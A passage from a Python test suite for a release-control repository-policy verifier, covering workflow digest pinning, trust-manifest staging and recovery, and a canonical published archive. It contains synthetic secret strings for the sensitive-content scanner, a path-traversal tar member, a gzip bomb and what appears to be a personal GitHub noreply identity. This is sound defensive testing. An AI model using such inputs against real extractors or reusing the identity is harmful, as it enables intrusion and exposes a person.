#!/usr/bin/env python3

import base64
import gzip
import hashlib
import importlib.util
import io
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import tarfile
import unittest
from pathlib import Path
from unittest import mock


sys.dont_write_bytecode = True
MODULE_PATH = Path(__file__).with_name("verify_repository_policy.py")
SPEC = importlib.util.spec_from_file_location("verify_repository_policy", MODULE_PATH)
assert SPEC and SPEC.loader
MODULE = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = MODULE
SPEC.loader.exec_module(MODULE)
SOURCE_ROOT = (
    MODULE_PATH.parents[3]
    if MODULE_PATH.parents[1].name == "next"
    and MODULE_PATH.parents[2].name == "trust"
    else MODULE_PATH.parents[1]
)
PUBLISHED_SOURCE_COMMIT = "16018f5842b4815e283d860b66d8614e0ce13e0a"
PUBLISHED_ROOT_TREE = "a61a13379f8e4b04612160829526d73c7ed5e1ce"
PUBLISHED_PYTHON_PATHS = frozenset(
    {
        "scripts/test_verify_authenticity.py",
        "scripts/test_verify_release.py",
        "scripts/test_verify_repository_policy.py",
        "scripts/verify_authenticity.py",
        "scripts/verify_release.py",
        "scripts/verify_repository_policy.py",
    }
)


class PublicRepositoryPolicyTests(unittest.TestCase):
    def copy_repository(self, directory: str) -> Path:
        root = Path(directory) / "release-control"
        shutil.copytree(SOURCE_ROOT, root, symlinks=True)
        document = self.load_trust_manifest(root)
        if "staged" in document:
            document.pop("staged")
            shutil.rmtree(root / MODULE.STAGED_ROOT.parts[0])
        document.setdefault(
            "bootstrapRecovery",
            {
                "sourceCommit": PUBLISHED_SOURCE_COMMIT,
                "rootTree": PUBLISHED_ROOT_TREE,
            },
        )
        self.write_trust_manifest(root, document)
        return root

    def materialize_published_snapshot(self, directory: str) -> Path:
        root = Path(directory) / "published-control"
        MODULE.materialize_published_snapshot(SOURCE_ROOT, root)
        return root

    def mutate_workflow(self, root: Path, old: str, new: str) -> None:
        self.mutate_named_workflow(root, "deploy-approved-release.yml", old, new)

    def mutate_named_workflow(
        self, root: Path, name: str, old: str, new: str
    ) -> None:
        path = root / ".github" / "workflows" / name
        text = path.read_text(encoding="utf-8")
        self.assertIn(old, text)
        path.write_text(text.replace(old, new, 1), encoding="utf-8")

    def mutate_signing_workflow(self, root: Path, old: str, new: str) -> None:
        self.mutate_named_workflow(root, "sign-authenticity-request.yml", old, new)

    def swap_checkout_field(
        self,
        root: Path,
        first_step_name: str,
        second_step_name: str,
        field: str,
    ) -> None:
        path = root / ".github" / "workflows" / "validate-control.yml"
        lines = path.read_text(encoding="utf-8").splitlines(keepends=True)
        locations: dict[str, int] = {}
        current_step: str | None = None
        for index, line in enumerate(lines):
            name = re.fullmatch(r"\s+- name: (.+)\n?", line)
            if name:
                current_step = name.group(1)
                continue
            if current_step in (first_step_name, second_step_name) and re.fullmatch(
                rf"\s+{re.escape(field)}: .+\n?", line
            ):
                self.assertNotIn(current_step, locations)
                locations[current_step] = index
        self.assertEqual({first_step_name, second_step_name}, set(locations))
        first = locations[first_step_name]
        second = locations[second_step_name]
        first_prefix, first_value = lines[first].split(": ", 1)
        second_prefix, second_value = lines[second].split(": ", 1)
        lines[first] = first_prefix + ": " + second_value
        lines[second] = second_prefix + ": " + first_value
        path.write_text("".join(lines), encoding="utf-8")

    def load_trust_manifest(self, root: Path) -> dict[str, object]:
        return json.loads((root / MODULE.TRUST_MANIFEST).read_text(encoding="utf-8"))

    def write_trust_manifest(self, root: Path, document: dict[str, object]) -> None:
        (root / MODULE.TRUST_MANIFEST).write_bytes(MODULE.canonical_json_bytes(document))

    def load_fixture(self, root: Path) -> dict[str, object]:
        return json.loads((root / MODULE.PUBLISHED_FIXTURE).read_text(encoding="utf-8"))

    def write_fixture(self, root: Path, document: dict[str, object]) -> None:
        (root / MODULE.PUBLISHED_FIXTURE).write_bytes(MODULE.canonical_json_bytes(document))

    def set_fixture_archive(
        self, fixture: dict[str, object], compressed: bytes, tar_size: int
    ) -> None:
        fixture["archive"] = {
            "base64": base64.b64encode(compressed).decode("ascii"),
            "compressedSha256": hashlib.sha256(compressed).hexdigest(),
            "compressedSize": len(compressed),
            "format": "canonical-tar-gzip-v1",
            "tarSize": tar_size,
        }

    def custom_archive(
        self, members: list[tuple[str, bytes, bytes, int]]
    ) -> tuple[bytes, bytes]:
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w", format=tarfile.USTAR_FORMAT) as archive:
            for name, content, member_type, mode in members:
                member = tarfile.TarInfo(name)
                member.type = member_type
                member.mode = mode
                member.mtime = 0
                member.uid = member.gid = 0
                member.size = len(content) if member_type == tarfile.REGTYPE else 0
                if member_type == tarfile.SYMTYPE:
                    member.linkname = "README.md"
                archive.addfile(member, io.BytesIO(content) if member.isreg() else None)
        tar_bytes = buffer.getvalue()
        compressed_buffer = io.BytesIO()
        with gzip.GzipFile(
            filename="", mode="wb", compresslevel=9, fileobj=compressed_buffer, mtime=0
        ) as gzip_file:
            gzip_file.write(tar_bytes)
        return compressed_buffer.getvalue(), tar_bytes

    def stage_complete_bundle(self, root: Path, marker: bytes = b"# reviewed next bytes\n") -> None:
        document = self.load_trust_manifest(root)
        contents: dict[str, bytes] = {}
        for relative in sorted(MODULE.TRUSTED_CODE_PATHS):
            content = (root / relative).read_bytes()
            if relative != MODULE.PUBLISHED_FIXTURE:
                content += marker
            contents[relative] = content

        verifier_path = "scripts/verify_repository_policy.py"
        verifier = contents[verifier_path].decode("utf-8")
        for name, current_digest in MODULE.TRUSTED_WORKFLOW_SHA256.items():
            relative = f".github/workflows/{name}"
            next_digest = hashlib.sha256(contents[relative]).hexdigest()
            old = f'    "{name}": "{current_digest}",'
            new = f'    "{name}": "{next_digest}",'
            self.assertIn(old, verifier)
            verifier = verifier.replace(old, new, 1)
        contents[verifier_path] = verifier.encode("utf-8")

        staged: dict[str, str] = {}
        for relative in sorted(MODULE.TRUSTED_CODE_PATHS):
            target = root / MODULE.STAGED_ROOT / relative
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(contents[relative])
            target.chmod(0o644)
            staged[relative] = hashlib.sha256(target.read_bytes()).hexdigest()
        document["staged"] = staged
        self.write_trust_manifest(root, document)

    def promote_staged_bundle(self, root: Path) -> None:
        document = self.load_trust_manifest(root)
        staged = document["staged"]
        self.assertIsInstance(staged, dict)
        for relative in sorted(MODULE.TRUSTED_CODE_PATHS):
            (root / relative).write_bytes((root / MODULE.STAGED_ROOT / relative).read_bytes())
        document["active"] = staged
        document.pop("bootstrapRecovery", None)
        self.write_trust_manifest(root, document)

    def cleanup_staged_bundle(self, root: Path) -> None:
        document = self.load_trust_manifest(root)
        document.pop("staged")
        shutil.rmtree(root / "trust")
        self.write_trust_manifest(root, document)

    def assert_sensitive_payload_parity(self, payload: str, label: str) -> None:
        with self.subTest(path="ordinary"):
            with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
                MODULE.scan_sensitive_bytes("ordinary.md", payload.encode())

        with self.subTest(path="archive"), tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            mutated = self.load_fixture(root)
            contents = MODULE.load_published_archive(mutated)
            contents["README.md"] = payload.encode()
            compressed, tar_bytes = MODULE.canonical_published_archive(contents)
            self.set_fixture_archive(mutated, compressed, len(tar_bytes))
            self.write_fixture(root, mutated)
            with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
                MODULE.load_published_fixture(root)

        with self.subTest(path="commit"):
            with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
                MODULE.validate_published_commit_headers(payload.encode())

        with self.subTest(path="end-to-end"), tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            (root / "docs" / "parity.md").write_text(payload, encoding="utf-8")
            with self.assertRaisesRegex(MODULE.PolicyError, rf"possible {label}"):
                MODULE.validate_self_check(root)

    def assert_safe_payload_parity(self, payload: str) -> None:
        with self.subTest(path="ordinary"):
            self.assertIsNone(MODULE.sensitive_content_label(payload))
            MODULE.scan_sensitive_bytes("ordinary.md", payload.encode())

        with self.subTest(path="archive"):
            MODULE.scan_sensitive_bytes("fixture.md", payload.encode())

        with self.subTest(path="commit"):
            fixture = self.load_fixture(SOURCE_ROOT)
            commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
            headers, separator, _ = commit.partition(b"\n\n")
            MODULE.validate_published_commit_headers(
                headers + separator + payload.encode() + b"\n"
            )

        with self.subTest(path="end-to-end"), tempfile.TemporaryDirectory() as directory:
            root = self.copy_repository(directory)
            (root / "docs" / "safe-parity.md").write_text(payload, encoding="utf-8")
            MODULE.validate_self_check(root)

    def test_current_scaffold_passes(self) -> None:
        self.assertEqual(
            MODULE.TRUSTED_WORKFLOW_SHA256,
            {
                path.name: hashlib.sha256(path.read_bytes()).hexdigest()
                for path in (SOURCE_ROOT / ".github" / "workflows").glob("*.yml")
            },
        )
        result = MODULE.validate_self_check(SOURCE_ROOT)
        self.assertGreater(result["files"], 8)

    def test_candidate_environment_symlink_is_never_resolved_as_fixture_source(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = Path(directory) / "candidate"
            candidate.symlink_to(candidate)
            probe = (
                "import importlib.util, pathlib; "
                f"path = pathlib.Path({str(Path(__file__).absolute())!r}); "
                "spec = importlib.util.spec_from_file_location('policy_tests_probe', path); "
                "module = importlib.util.module_from_spec(spec); "
                "spec.loader.exec_module(module); "
                "print(module.SOURCE_ROOT)"
            )
            result = subprocess.run(
                [sys.executable, "-c", probe],
                cwd=SOURCE_ROOT,
                env={
                    **os.environ,
                    "CANDIDATE_ROOT": str(candidate),
                    "PUBLIC_REPOSITORY_UNDER_TEST": str(candidate),
                    "PYTHONDONTWRITEBYTECODE": "1",
                },
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(0, result.returncode, result.stdout + result.stderr)
            self.assertEqual(str(SOURCE_ROOT), result.stdout.strip())

    def test_container_and_services_keys_fail_before_semantic_validation(self) -> None:
        mutations = (
            ("    runs-on: ubuntu-latest", "    container: alpine:latest\n    runs-on: ubuntu-latest"),
            ("    runs-on: ubuntu-latest", "    services: {}\n    runs-on: ubuntu-latest"),
        )
        for old, new in mutations:
            with self.subTest(new=new), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                self.mutate_workflow(root, old, new)
                with self.assertRaisesRegex(MODULE.PolicyError, "workflow byte digest mismatch"):
                    MODULE.validate_workflows(root)

    def test_arbitrary_one_byte_change_fails_for_every_workflow(self) -> None:
        for name in sorted(MODULE.EXPECTED_WORKFLOWS):
            with self.subTest(name=name), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                path = root / ".github" / "workflows" / name
                content = bytearray(path.read_bytes())
                offset = len(content) // 2
                content[offset] ^= 1
                path.write_bytes(content)
                with self.assertRaisesRegex(MODULE.PolicyError, "workflow byte digest mismatch"):
                    MODULE.validate_workflows(root)

    def test_published_workflow_and_legacy_positional_cli_remain_bootstrap_compatible(
        self,
    ) -> None:
        workflow = SOURCE_ROOT / ".github" / "workflows" / "validate-control.yml"
        self.assertEqual(
            "12c6efc77b7cec8964ea39c7ee845607027811ca8a9383892ffbb119a6d56638",
            hashlib.sha256(workflow.read_bytes()).hexdigest(),
        )
        self.assertEqual(
            2,
            workflow.read_text(encoding="utf-8").count(
                'run: python3 scripts/verify_repository_policy.py "$CANDIDATE_ROOT"'
            ),
        )

        with tempfile.TemporaryDirectory() as directory:
            trusted = self.copy_repository(str(Path(directory) / "trusted"))
            candidate = self.copy_repository(str(Path(directory) / "candidate"))
            relative = "scripts/verify_release.py"
            trusted_file = candidate / relative
            trusted_file.write_bytes(trusted_file.read_bytes() + b"# direct mutation\n")
            document = self.load_trust_manifest(candidate)
            document["active"][relative] = hashlib.sha256(
                trusted_file.read_bytes()
            ).hexdigest()
            self.write_trust_manifest(candidate, document)
            result = subprocess.run(
                [sys.executable, str(MODULE_PATH), str(candidate)],
                cwd=trusted,
                env={**os.environ, "PYTHONDONTWRITEBYTECODE": "1"},
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(1, result.returncode)
            self.assertIn("trusted-code transition", result.stderr)

    def test_workflow_equivalent_bootstrap_and_exact_recovery_pass(self) -> None:
        document = self.load_trust_manifest(SOURCE_ROOT)
        self.assertEqual("staged" in document, (SOURCE_ROOT / "trust").exists())
        fixture_path = SOURCE_ROOT / "docs" / "published-python-controls.json"
        raw = fixture_path.read_bytes()
        fixture = json.loads(raw)
        self.assertEqual(MODULE.canonical_json_bytes(fixture), raw)
        self.assertEqual({"archive", "formatVersion", "sourceCommit", "files"}, set(fixture))
        self.assertEqual(3, fixture["formatVersion"])
        self.assertEqual(PUBLISHED_SOURCE_COMMIT, fixture["sourceCommit"]["objectId"])
        self.assertEqual(PUBLISHED_ROOT_TREE, fixture["sourceCommit"]["rootTree"])
        commit_bytes = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
        commit_text = MODULE.validate_published_commit_headers(commit_bytes)
        self.assertIn(
            f"author {MODULE.APPROVED_PUBLISHED_COMMIT_IDENTITY} ", commit_text
        )
        self.assertIn(
            f"committer {MODULE.APPROVED_PUBLISHED_COMMIT_IDENTITY} ", commit_text
        )
        self.assertEqual(
            2, commit_text.lower().count("noreply" + ".github.com")
        )
        self.assertEqual(19, len(fixture["files"]))
        MODULE.load_published_fixture(SOURCE_ROOT)
        archive_contents = MODULE.load_published_archive(fixture)
        self.assertEqual(MODULE.PUBLISHED_SNAPSHOT_PATHS, set(archive_contents))
        self.assertEqual(PUBLISHED_PYTHON_PATHS, {p for p in archive_contents if p.endswith(".py")})

        with tempfile.TemporaryDirectory() as directory:
            published_root = Path(directory) / "published-control"
            MODULE.materialize_published_snapshot(SOURCE_ROOT, published_root)
            active_root = self.copy_repository(str(Path(directory) / "active"))

            environment = {
                **os.environ,
                "PYTHONDONTWRITEBYTECODE": "1",
                "PUBLIC_REPOSITORY_UNDER_TEST": str(published_root),
                "CANDIDATE_ROOT": str(active_root),
            }
            commands = (
                [sys.executable, "scripts/test_verify_release.py"],
                [sys.executable, "scripts/test_verify_authenticity.py"],
                [sys.executable, "scripts/test_verify_repository_policy.py"],
                [
                    sys.executable,
                    "scripts/verify_repository_policy.py",
                    str(active_root),
                ],
            )
            for command in commands:
                with self.subTest(command=command):
                    result = subprocess.run(
                        command,
                        cwd=published_root,
                        env=environment,
                        check=False,
                        capture_output=True,
                        text=True,
                    )
                    self.assertEqual(
                        0,
                        result.returncode,
                        result.stdout + result.stderr,
                    )

            if MODULE_PATH.parent == SOURCE_ROOT / "scripts":
                recovery_environment = {
                    **os.environ,
                    "PYTHONDONTWRITEBYTECODE": "1",
                    "PUBLIC_REPOSITORY_UNDER_TEST": str(published_root),
                    "CANDIDATE_ROOT": str(published_root),
                }
                recovery_commands = (
                    [sys.executable, "scripts/test_verify_release.py"],
                    [sys.executable, "scripts/test_verify_authenticity.py"],
                    [sys.executable, "scripts/test_verify_repository_policy.py"],
                    [
                        sys.executable,
                        "scripts/verify_repository_policy.py",
                        str(published_root),
                    ],
                )
                for command in recovery_commands:
                    with self.subTest(recovery_command=command):
                        result = subprocess.run(
                            command,
                            cwd=published_root,
                            env=recovery_environment,
                            check=False,
                            capture_output=True,
                            text=True,
                        )
                        self.assertEqual(
                            0,
                            result.returncode,
                            result.stdout + result.stderr,
                        )

    def test_manifest_covers_all_workflows_verifiers_helpers_and_tests(self) -> None:
        document = MODULE.validate_trust_state(SOURCE_ROOT)
        self.assertEqual(2, document["version"])
        if "bootstrapRecovery" in document:
            self.assertEqual(
                {
                    "sourceCommit": PUBLISHED_SOURCE_COMMIT,
                    "rootTree": PUBLISHED_ROOT_TREE,
                },
                document["bootstrapRecovery"],
            )
        self.assertEqual(MODULE.TRUSTED_CODE_PATHS, set(document["active"]))
        self.assertEqual(10, len(document["active"]))
        self.assertEqual(3, sum(path.startswith(".github/workflows/") for path in document["active"]))
        self.assertEqual(6, sum(path.startswith("scripts/") for path in document["active"]))
        self.assertIn("docs/published-python-controls.json", document["active"])

    def test_clean_runner_self_check_requires_only_cosign(self) -> None:
        verifier_source = MODULE_PATH.read_text(encoding="utf-8")
        for prohibited in ("import subprocess", "import socket", "import urllib"):
            self.assertNotIn(prohibited, verifier_source)
        cosign = shutil.which("cosign")
        self.assertIsNotNone(cosign, "Cosign must be available for repository policy tests")
        assert cosign is not None
        with tempfile.TemporaryDirectory() as directory:
            environment = {
                "HOME": str(Path(directory) / "absent-home"),
                "PATH": str(Path(cosign).resolve().parent),
                "PYTHONDONTWRITEBYTECODE": "1",
                "TMPDIR": str(Path(directory) / "absent-temp"),
            }
            result = subprocess.run(
                [sys.executable, str(MODULE_PATH), "--self-check", str(SOURCE_ROOT)],
                cwd=SOURCE_ROOT,
                env=environment,
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(0, result.returncode, result.stdout + result.stderr)

    def test_fixture_rejects_schema_base64_digest_blob_commit_tree_and_bounds_drift(self) -> None:
        mutations = {
            "unknown field": lambda value: value.update({"unknown": True}),
            "missing path": lambda value: value["files"].pop(next(iter(value["files"]))),
            "unknown path": lambda value: value["files"].update(
                {"scripts/unknown.py": next(iter(value["files"].values()))}
            ),
            "malformed base64": lambda value: value["archive"].update({"base64": "%%%"}),
            "oversize": lambda value: value["archive"].update(
                {
                    "base64": "A"
                    * (((MODULE.MAX_PUBLISHED_ARCHIVE_COMPRESSED_BYTES + 2) // 3) * 4 + 4)
                }
            ),
            "archive sha drift": lambda value: value["archive"].update(
                {"compressedSha256": "0" * 64}
            ),
            "blob drift": lambda value: value["files"][next(iter(value["files"]))].update(
                {"gitBlobSha1": "0" * 40}
            ),
            "commit drift": lambda value: value["sourceCommit"].update(
                {"rawBase64": base64.b64encode(b"tree " + b"0" * 40 + b"\n").decode()}
            ),
            "tree drift": lambda value: value["sourceCommit"].update(
                {"rootTree": "0" * 40}
            ),
            "mode drift": lambda value: value["files"][next(iter(value["files"]))].update(
                {"mode": "100755"}
            ),
        }
        for label, mutate in mutations.items():
            with self.subTest(label=label), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                fixture = self.load_fixture(root)
                mutate(fixture)
                self.write_fixture(root, fixture)
                with self.assertRaises(MODULE.PolicyError):
                    MODULE.load_published_fixture(root)

    def test_fixture_rejects_malformed_noncanonical_and_oversized_archives(self) -> None:
        valid_contents = MODULE.load_published_archive(self.load_fixture(SOURCE_ROOT))
        regular_members = [
            (path, content, tarfile.REGTYPE, 0o644)
            for path, content in sorted(valid_contents.items())
        ]
        variants: dict[str, tuple[bytes, int]] = {}
        for label, members in (
            ("traversal", [("../escape", b"x", tarfile.REGTYPE, 0o644)]),
            ("symlink", [("README.md", b"", tarfile.SYMTYPE, 0o644)]),
            ("nonregular", [("README.md", b"", tarfile.DIRTYPE, 0o755)]),
            ("extra", regular_members + [("extra.md", b"x", tarfile.REGTYPE, 0o644)]),
            ("missing", regular_members[1:]),
            (
                "mode",
                [(regular_members[0][0], regular_members[0][1], tarfile.REGTYPE, 0o755)]
                + regular_members[1:],
            ),
            (
                "member oversize",
                [("README.md", b"x" * (MODULE.MAX_FILE_BYTES + 1), tarfile.REGTYPE, 0o644)],
            ),
        ):
            compressed, tar_bytes = self.custom_archive(members)
            variants[label] = (compressed, len(tar_bytes))
        variants["malformed gzip"] = (b"not-gzip", 1)
        bomb = gzip.compress(b"x" * (MODULE.MAX_PUBLISHED_ARCHIVE_BYTES + 1), mtime=0)
        variants["decompressed oversize"] = (bomb, MODULE.MAX_PUBLISHED_ARCHIVE_BYTES + 1)
        valid_compressed, valid_tar = MODULE.canonical_published_archive(valid_contents)
        noncanonical_buffer = io.BytesIO()
        with gzip.GzipFile(filename="", mode="wb", fileobj=noncanonical_buffer, mtime=1) as stream:
            stream.write(valid_tar)
        variants["nondeterministic gzip"] = (noncanonical_buffer.getvalue(), len(valid_tar))

        for label, (compressed, tar_size) in variants.items():
            with self.subTest(label=label), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                fixture = self.load_fixture(root)
                self.set_fixture_archive(fixture, compressed, tar_size)
                self.write_fixture(root, fixture)
                with self.assertRaises(MODULE.PolicyError):
                    MODULE.load_published_fixture(root)

    def test_fixture_scans_every_decoded_member_before_identity_rejection(self) -> None:
        payloads = (
            b'pass' + b'word = "SYNTHETIC-' + b'CREDENTIAL-123"\n',
            b'credential = "github_' + b'pat_ABCDEFGHIJKLMNOPQRSTUVWXYZ"\n',
            b'key = "-----BEGIN ' + b'PRIVATE KEY-----"\n',
            b'host = "192.' + b'168.4.20"\n',
            b'patient' + b'Id = "SYNTHETIC-123"\n',
            b'M' + b'RN: "TEST-9988"\n',
        )
        for payload in payloads:
            with self.subTest(payload=payload), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                fixture = self.load_fixture(root)
                contents = MODULE.load_published_archive(fixture)
                contents["README.md"] = payload
                compressed, tar_bytes = MODULE.canonical_published_archive(contents)
                self.set_fixture_archive(fixture, compressed, len(tar_bytes))
                self.write_fixture(root, fixture)
                with self.assertRaisesRegex(MODULE.PolicyError, "possible"):
                    MODULE.load_published_fixture(root)

    def test_fixture_scans_decoded_raw_commit_headers_for_identity_disclosures(self) -> None:
        fixture = self.load_fixture(SOURCE_ROOT)
        valid_commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
        self.assertEqual(
            valid_commit.decode("utf-8"),
            MODULE.validate_published_commit_headers(valid_commit),
        )
        variants = (
            (
                "near-match login",
                valid_commit.replace(
                    MODULE.APPROVED_PUBLISHED_COMMIT_IDENTITY.encode(),
                    b"zelalemgbb <78460729+zelalemgb@users."
                    + b"noreply.github.com>",
                ),
                "personal GitHub noreply identity",
            ),
            (
                "near-match numeric ID",
                valid_commit.replace(
                    MODULE.APPROVED_PUBLISHED_COMMIT_IDENTITY.encode(),
                    b"zelalemgb <78460728+zelalemgb@users." + b"noreply.github.com>",
                ),
                "personal GitHub noreply identity",
            ),
            (
                "other GitHub noreply identity",
                valid_commit.replace(
                    MODULE.APPROVED_PUBLISHED_COMMIT_IDENTITY.encode(),
                    b"other-user <123456+other-user@users." + b"noreply.github.com>",
                ),
                "personal GitHub noreply identity",
            ),
            (
                "prohibited identity data",
                valid_commit.replace(
                    MODULE.APPROVED_PUBLISHED_COMMIT_IDENTITY.encode(),
                    b"Link Release Control <github_"
                    + b"pat_ABCDEFGHIJKLMNOPQRSTUVWXYZ>",
                ),
                "access token",
            ),
        )
        for label, commit_bytes, message in variants:
            with self.subTest(label=label), tempfile.TemporaryDirectory() as directory:
                root = self.copy_repository(directory)
                mutated = self.load_fixture(root)
                object_id = MODULE.git_object_id("commit", commit_bytes)
                mutated["sourceCommit"]["rawBase64"] = base64.b64encode(
                    commit_bytes
                ).decode("ascii")
                mutated["sourceCommit"]["objectId"] = object_id
                self.write_fixture(root, mutated)
                with mock.patch.object(MODULE, "PUBLISHED_SOURCE_COMMIT", object_id):
                    with self.assertRaisesRegex(MODULE.PolicyError, message):
                        MODULE.load_published_fixture(root)

    def test_exact_published_identity_is_allowed_only_in_validated_headers(self) -> None:
        fixture = self.load_fixture(SOURCE_ROOT)
        valid_commit = base64.b64decode(fixture["sourceCommit"]["rawBase64"], validate=True)
        headers, separator, message = valid_commit.partition(b"\n\n")
        self.assertTrue(separator)
        candidate = (
            headers
            + separator
            + message
            + b"\n"
            + MODULE.APPROVED_PUBLISHED_COMMIT_IDENTITY.encode()
            + b"\n"
        )
        with self.assertRaisesRegex(
            MODULE.PolicyError, "personal GitHub noreply identity"
        ):
            MODULE.validate_published_commit_headers(candidate)

    def test_valid_unchanged_stage_promote_and_cleanup_transitions(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = self.copy_repository(str(Path(directory) / "base"))
            unchanged = self.copy_repository(str(Path(directory) / "unchanged"))
            self.assertEqual("unchanged", MODULE.validate_trusted_code_transition(base, unchanged))

            staged = self.copy_repository(str(Path(directory) / "staged"))
            self.stage_complete_bundle(staged)
            self.assertEqual("stage", MODULE.validate_trusted_code_transition(base, staged))

            promoted = Path(directory) / "promoted" / "release-control"
            promoted.parent.mkdir()
            shutil.copytree(staged, promoted)
            self.promote_staged_bundle(promoted)
            promoted_bindings = MODULE.load_verifier_workflow_bindings(
                promoted / "scripts" / "verify_repository_policy.py"
            )
            self.assertNotEqual(MODULE.TRUSTED_WORKFLOW_SHA256, promoted_bindings)
            MODULE.validate_workflow_bytes(promoted, promoted_bindings)
            self.assertEqual("promote", MODULE.validate_trusted_code_transition(staged, promoted))
            MODULE.validate_transition(staged, promoted)

            cleaned = Path(directory) / "cleaned" / "release-control"
            cleaned.parent.mkdir()
            shutil.copytree(promoted, cleaned)
            self.cleanup_staged_bundle(cleaned)
            self.assertEqual("cleanup", MODULE.validate_trusted_code_transition(promoted, cleaned))

    def test_exact_bootstrap_recovery_before_and_after_stage_passes(self) -> None:
        for staged_base in (False, True):
            with self.subTest(staged_base=staged_base), tempfile.TemporaryDirectory() as directory:
                base = self.copy_repository(str(Path(directory) / "base"))
                if staged_base:
                    self.stage_complete_bundle(base)
                recovery = self.materialize_published_snapshot(str(Path(directory) / "candidate"))
                self.assertEqual(
                    "bootstrap-recovery",
                    MODULE.validate_trusted_code_transition(base, recovery),
                )
                result = MODULE.validate_transition(base, recovery)
                self.assertEqual(19, result["files"])

    def test_exact_recovery_ends_lineage_and_rehardening_starts_a_new_bootstrap(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            hardened = self.copy_repository(str(Path(directory) / "hardened"))
            recovered = self.materialize_published_snapshot(str(Path(directory) / "recovered"))
            self.assertEqual(
                "bootstrap-recovery",
                MODULE.validate_trusted_code_transition(hardened, recovered),
            )
            self.assertFalse((recovered / MODULE.TRUST_MANIFEST).exists())

            new_hardening = self.copy_repository(str(Path(directory) / "new-hardening"))
            result = subprocess.run(
                [sys.executable, "scripts/verify_repository_policy.py", str(new_hardening)],
                cwd=recovered,
                env={
                    **os.environ,
                    "CANDIDATE_ROOT": str(new_hardening),
                    "PUBLIC_REPOSITORY_UNDER_TEST": str(new_hardening),
                    "PYTHONDONTWRITEBYTECODE": "1",
                },
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(0, result.returncode, result.stdout + result.stderr)
            self.assertIn("bootstrapRecovery", self.load_trust_manifest(new_hardening))

    def test_bootstrap_recovery_rejects_missing_extra_changed_symlink_and_mode_drift(self) -> None:
        mutations = ("missing", "extra", "changed", "symlink", "mode")
        for mutation in mutations:
            with self.subTest(mutation=mutation), tempfile.TemporaryDirectory() as directory:
                base = self.copy_repository(str(Path(directory) / "base"))
                recovery = self.materialize_published_snapshot(str(Path(directory) / "candidate"))
                target = recovery / "README.md"
                if mutation == "missing":
                    target.unlink()
                elif mutation == "extra":
                    (recovery / "extra.md").write_text("extra\n", encoding="utf-8")
                elif mutation == "changed":
                    target.write_bytes(target.read_bytes() + b"changed\n")
                elif mutation == "symlink":
                    target.unlink()
                    target.symlink_to(recovery / "SECURITY.md")
                else:
                    target.chmod(0o755)
                with self.assertRaises(MODULE.PolicyError):
                    MODULE.validate_trusted_code_transition(base, recovery)

    def test_promotion_consumes_recovery_within_the_hardened_lineage(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            staged = self.copy_repository(str(Path(directory) / "staged"))
            self.stage_complete_bundle(staged)
            promoted = self.copy_repository(str(Path(directory) / "promoted"))
            self.stage_complete_bundle(promoted)
            self.promote_staged_bundle(promoted)
            self.assertNotIn("bootstrapRecovery", self.load_trust_manifest(promoted))
            self.assertEqual("promote", MODULE.validate_trusted_code_transition(staged, promoted))

            cleaned = self.copy_repository(str(Path(directory) / "cleaned"))
            self.stage_complete_bundle(cleaned)
            self.promote_staged_bundle(cleaned)
            self.cleanup_staged_bundle(cleaned)
            self.assertEqual("cleanup", MODULE.validate_trusted_code_transition(promoted, cleaned))

            recovery = self.materialize_published_snapshot(str(Path(directory) / "recovery"))
            with self.assertRaisesRegex(MODULE.PolicyError, "not authorized"):
                MODULE.validate_trusted_code_transition(cleaned, recovery)

            restored = Path(directory) / "restored" / "release-control"
            restored.parent.mkdir()
            shutil.copytree(cleaned, restored)
            document = self.load_trust_manifest(restored)
            document["bootstrapRecovery"] = {
                "sourceCommit": PUBLISHED_SOURCE_COMMIT,
                "rootTree": PUBLISHED_ROOT_TREE,
            }
            self.write_trust_manifest(restored, document)
            with self.assertRaisesRegex(MODULE.PolicyError, "cannot be restored"):
                MODULE.validate_trusted_code_transition(cleaned, restored)

    def test_cli_self_check_and_distinct_transition_modes(self) -> None:
        commands = (
            (["--self-check", str(SOURCE_ROOT)], 0),
            (
                [
                    "--trusted-root",
                    str(SOURCE_ROOT),
                    "--candidate-root",
                    str(SOURCE_ROOT),
                ],
                1,
            ),
            (["--trusted-root", str(SOURCE_ROOT)], 2),
            (["--candidate-root", str(SOURCE_ROOT)], 2),
            ([str(SOURCE_ROOT)], 1),
        )
        for arguments, expected in commands:
            with self.subTest(arguments=arguments):
                result = subprocess.run(
                    [sys.executable, str(MODULE_PATH), *arguments],
                    cwd=SOURCE_ROOT,
                    env={**os.environ, "PYTHONDONTWRITEBYTECODE": "1"},
                    check=False,
                    capture_output=True,
                    text=True,
                )
                self.assertEqual(expected, result.returncode, result.stdout + result.stderr)

    def test_direct_trusted_code_mutation_and_mapping_rewrite_fail(self) -> None:
        for relative in sorted(MODULE.TRUSTED_CODE_PATHS):
            with self.subTest(relative=relative), tempfile.TemporaryDirectory() as directory:
                base = self.copy_repository(str(Path(directory) / "base"))
                candidate = self.copy_repository(str(Path(directory) / "candidate"))
                path = candidate / relative
                path.write_bytes(path.read_bytes() + b"# direct mutation\n")
                document = self.load_trust_manifest(candidate)
